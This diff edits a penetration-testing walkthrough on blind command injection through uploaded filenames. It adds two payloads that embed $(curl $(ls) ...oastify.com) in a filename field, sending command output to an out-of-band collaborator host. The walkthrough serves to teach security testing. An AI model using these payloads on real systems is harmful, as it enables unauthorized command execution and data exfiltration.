@@ -45,9 +45,9 @@ We request it, go back, poll for it, and see another HTTP request come in. Looki
 
 By default, you should always try these cURL commands and have a server where you can monitor requests. This could be a Burp Collaborator, Netcat listener, or a subdomain you own. Having some way to monitor requests is crucial.
 
-It doesn't have to be "uname." We can also send an "ls" command. We poll again, and another request comes in. Looking at it, it says "uploads," meaning that the uploads folder exists.
+It doesn't have to be "uname." We can also send an "ls" command  ( `filename="test123 $(curl $(ls) 1kmh59amqrfg17glhd9bawa56wcn0do2.oastify.com) .PNG"` ). We poll again, and another request comes in. Looking at it, it says "uploads," meaning that the uploads folder exists.
 
-We can verify further by trying "ls uploads." Depending on how the application works, this may or may not give an answer due to spacing within the command. We try again, poll, and see a response: "test123.png," which was one of the first files we uploaded to the web server. This confirms that we are successfully executing commands.
+We can verify further by trying "ls uploads"  ( `filename="test123 $(curl $(ls uploads) 1kmh59amqrfg17glhd9bawa56wcn0do2.oastify.com) .PNG"` ) . Depending on how the application works, this may or may not give an answer due to spacing within the `$(ls upload)` command. We try again, poll, and see a response: "test123.png," which was one of the first files we uploaded to the web server. This confirms that we are successfully executing commands.
 
 Again, it's important to understand how these applications work. You want to test every single user input that has an output. There are many different attack scenarios that can come up. It all comes down to what you're testing for.
 
